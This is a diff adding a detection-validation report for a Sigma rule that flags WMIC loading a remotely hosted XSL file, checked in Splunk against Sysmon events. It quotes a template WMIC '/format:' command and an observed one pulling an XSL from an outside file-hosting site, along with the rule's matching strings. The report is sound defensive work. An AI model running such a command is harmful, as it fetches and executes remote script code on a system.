@@ -1,0 +1,90 @@
+# Detection Validation
+
+## Objective
+
+Validate that the Sigma rule correctly identifies suspicious WMIC execution involving a remotely hosted XSL file.
+
+---
+
+## Sigma Rule
+
+**Rule:** Suspicious WMIC Remote XSL Execution
+
+**File:**
+
+`sigma.yml`
+
+The rule detects `wmic.exe` execution where the command line contains:
+
+- `process list`
+- `/format:`
+- `http`
+- `.xsl`
+
+---
+
+## Validation Process
+
+1. Loaded the Sigma rule.
+2. Checked the rule structure and detection logic.
+3. Converted the Sigma rule into Splunk SPL.
+4. Imported the Sysmon dataset into Splunk.
+5. Executed the generated SPL query.
+6. Reviewed the returned Sysmon events.
+7. Compared the detection output against the original event data.
+
+---
+
+## Expected Detection
+
+The detection should identify WMIC execution similar to:
+
+`wmic process list /format:"https://<external-host>/<file>.xsl"`
+
+---
+
+## Observed Match
+
+The dataset contains:
+
+- `Image: C:\Windows\System32\wbem\WMIC.exe`
+- `CommandLine: process list /format:"https://a.uguu.se/x50IGVBRfr55_test.xsl"`
+
+The event satisfies the Sigma detection conditions.
+
+---
+
+## Supporting Telemetry
+
+Additional Sysmon events associated with the same process show:
+
+- Event ID 7 — `msxml3.dll` loaded by WMIC
+- Event ID 11 — XSL file created
+- Event ID 3 — Outbound network connections
+
+These events provide supporting evidence for the suspicious execution.
+
+---
+
+## Validation Result
+
+**Status: PASS**
+
+The Sigma rule successfully identifies the suspicious WMIC execution present in the dataset.
+
+The detection was further supported by correlated Sysmon file, image-load, and network activity.
+
+---
+
+## False Positive Considerations
+
+Legitimate administrative scripts may use WMIC with the `/format` parameter.
+
+Potential tuning considerations include:
+
+- Approved administrative scripts
+- Trusted internal XSL locations
+- Known management tools
+- Authorized system administrators
+
+The use of an externally hosted XSL resource should receive higher investigation priority.
